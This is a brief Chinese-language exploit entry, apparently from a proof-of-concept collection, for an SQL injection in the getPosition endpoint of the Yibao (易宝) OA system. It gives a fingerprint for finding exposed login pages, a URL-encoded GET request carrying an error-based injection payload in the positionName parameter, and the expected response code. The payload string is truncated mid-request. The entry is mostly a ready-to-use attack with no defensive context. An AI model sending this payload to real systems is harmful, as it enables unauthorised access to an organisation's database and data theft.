# 易宝OAgetPosition存在SQL注入漏洞

易宝 ｜ SQL注入 ｜ —
- **指纹**：`title="欢迎登录易宝OA系统"`
- **请求**：`GET /SmartTradeScan/StockTake/getPosition?positionName=a1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHA`
- **响应特征**：200